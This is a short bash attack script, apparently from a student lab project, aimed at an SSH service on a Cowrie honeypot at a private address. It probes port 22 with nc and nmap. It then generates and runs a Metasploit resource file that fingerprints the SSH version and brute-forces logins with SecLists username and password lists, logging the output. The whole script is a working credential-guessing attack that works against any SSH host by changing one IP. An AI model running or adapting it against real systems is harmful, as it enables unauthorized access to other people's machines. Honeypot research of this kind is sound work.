#!/bin/bash
# SSH exploitation - targets Cowrie

COWRIE="172.16.0.20"
LOGDIR="/home/kali/Desktop/fyp/attack_scripts/logs/exploitation"
USERS="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
PASS="/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt"

mkdir -p "$LOGDIR"

echo "SSH exploitation on $COWRIE"

if nc -zw2 "$COWRIE" 22 2>/dev/null; then
    nmap -p 22 --script ssh-hostkey,ssh2-enum-algos "$COWRIE" -oN "$LOGDIR/ssh_nmap_${COWRIE}.txt"
    
    RCFILE="/tmp/msf_ssh_${COWRIE}.rc"
    cat > "$RCFILE" << EOF
use auxiliary/scanner/ssh/ssh_version
set RHOSTS $COWRIE
run
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $COWRIE
set USER_FILE $USERS
set PASS_FILE $PASS
set STOP_ON_SUCCESS true
run
exit
EOF
    timeout 180 msfconsole -q -r "$RCFILE" 2>/dev/null > "$LOGDIR/ssh_msf_${COWRIE}.txt"
    rm -f "$RCFILE"
else
    echo "SSH not open"
fi

echo "Done"
